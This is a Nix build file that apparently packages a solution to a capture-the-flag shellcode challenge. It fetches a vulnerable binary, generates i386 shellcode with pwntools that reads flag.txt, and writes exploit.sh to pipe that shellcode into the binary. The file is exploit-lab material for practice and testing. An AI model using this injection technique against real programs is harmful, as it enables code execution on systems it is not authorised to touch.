{ pkgs }:
pkgs.stdenv.mkDerivation {
  pname = "cc-be-handy-shellcode";
  version = "1";

  src = pkgs.fetchurl {
    url = "https://shell1.production.cognitivectf.com/static/a2ca0dccd07a850a295dc299b763230a/vuln";
    sha256 = "a3rOqCTqSOD2WFTqxeDMaVjOkabQ0iOWiU3wKxynLxc=";
  };

  buildInputs = [
    pkgs.python3
    pkgs.pwntools
  ];

  unpackPhase = ''
    mkdir -p "$out"

    cp "$src" "$out/vuln"
    chmod +x "$out/vuln"
  '';

  buildPhase = ''
    cat << EOF > transform.py
    from pwn import asm, context
    from pwnlib import shellcraft
    from pwnlib.encoders import encoder as m_encoder

    context.arch = "i386"

    asm_code = shellcraft.cat("flag.txt")
    machine_code = asm(asm_code)
    print(repr(machine_code)[1:])
    EOF

    shellcode=`python3 transform.py`
    cat << EOF > $out/exploit.sh
    printf $shellcode | ./vuln
    EOF
      chmod +x "$out/exploit.sh"

      echo "CTF{Dummyflag}" > "$out/flag.txt"

      # cd "$out"
      # sh exploit.sh > "$out/output.txt"
  '';
}
